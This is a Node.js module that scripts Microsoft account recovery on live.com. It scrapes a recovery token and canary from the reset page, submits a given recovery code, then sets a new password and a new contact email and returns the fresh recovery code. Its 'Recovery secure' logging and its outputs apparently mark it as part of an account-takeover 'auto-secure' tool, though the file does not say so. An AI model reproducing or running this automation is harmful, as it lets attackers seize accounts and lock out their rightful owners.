const HttpClient = require("../process/HttpClient");

module.exports = async (email, recoveryCode, secEmail, password) => {
    console.log(`Recovery secure called with ${email} ${recoveryCode} ${secEmail}`);

    try {
        const axios = new HttpClient(false);

        const data = await axios.get(
            `https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=${encodeURIComponent(email)}`,
            { proxy: false }
        );

        if (!data?.data || data.data.includes("reset-password-signinname_en")) {
            console.log(`Invalid email or reset page error!`);
            return null;
        }

        let serverData = null;
        const match = data.data.match(/var\s+ServerData\s*=\s*({[\s\S]*?});/);
        if (match) {
            try {
                serverData = JSON.parse(match[1]);
            } catch (e) {
                console.log(`Error parsing ServerData:`, e.message);
            }
        }

        if (!serverData) {
            const fallbackMatch = data.data.match(/var\s+ServerData\s*=\s*({.*?});/s);
            if (fallbackMatch) {
                try {
                    serverData = JSON.parse(fallbackMatch[1]);
                } catch (e) {}
            }
        }

        if (!serverData?.sRecoveryToken || !serverData?.apiCanary) {
            console.log(`Returning early cause of missing ServerData fields`);
            return null;
        }

        const recTokenResponse = await axios.post(
            "https://account.live.com/API/Recovery/VerifyRecoveryCode",
            {
                publicKey: "2CBB3761027476727BDDBC9DE02870BE01ED793A",
                recoveryCode: recoveryCode,
                code: recoveryCode,
                scid: 100103,
                token: decodeURIComponent(serverData.sRecoveryToken),
                uiflvr: 1001,
            },
            {
                headers: {
                    "Content-type": "application/json; charset=utf-8",
                    "canary": serverData.apiCanary,
                }
            }
        );

        if (!recTokenResponse?.data?.token) {
            console.log(`VerifyRecoveryCode failed:`, JSON.stringify(recTokenResponse?.data));
            if (recTokenResponse?.data?.error?.code === "6001") return "tfa";
            if (recTokenResponse?.data?.error?.code === "1218") return "same";
            return "invalid";
        }

        const maxRetries = 3;
        for (let attempt = 0; attempt <= maxRetries; attempt++) {
            try {
                console.log(`Recovery attempt ${attempt + 1}`);

                const recoveryResponse = await axios.post(
                    "https://account.live.com/API/Recovery/RecoverUser",
                    {
                        contactEmail: secEmail,
                        contactEpid: "",
                        password: password,
                        passwordExpiryEnabled: 0,
                        publicKey: "2CBB3761027476727BDDBC9DE02870BE01ED793A",
                        token: decodeURIComponent(recTokenResponse.data.token),
                    },
                    {
                        headers: {
                            "Content-type": "application/json; charset=utf-8",
                            "Canary": serverData.apiCanary,
                        }
                    }
                );

                console.log(`recovery log:`, JSON.stringify(recoveryResponse?.data));

                if (recoveryResponse?.data?.error) {
                    if (recoveryResponse.data.error.code === "6001") {
                        console.log(`tfa issue!`);
                        return "tfa";
                    } else if (recoveryResponse.data.error.code === "1218") {
                        console.log(`Returning same!`);
                        return "same";
                    }
                }

                if (recoveryResponse?.data?.apiCanary || recoveryResponse?.data?.recoveryCode) {
                    return {
                        email2: email,
                        recoveryCode: recoveryResponse.data.recoveryCode,
                        secEmail: secEmail,
                        password: password,
                    };
                }

            } catch (error) {
                console.error(`Recovery attempt ${attempt + 1} failed:`, error.message);

                const errData = error.response?.data;

                if (errData?.error) {
                    if (errData.error.code === "6001") {
                        return "tfa";
                    } else if (errData.error.code === "1218") {
                        return "same";
                    }
                }

                if (attempt === maxRetries) {
                    if (errData?.recoveryCode) {
                        return {
                            email2: email,
                            recoveryCode: errData.recoveryCode,
                            secEmail: secEmail,
                            password: password,
                        };
                    }
                    return "invalid";
                }
            }
        }
    } catch (error) {
        console.error('Error in recovery process:', error.message);
        return "invalid";
    }

    return "invalid";
};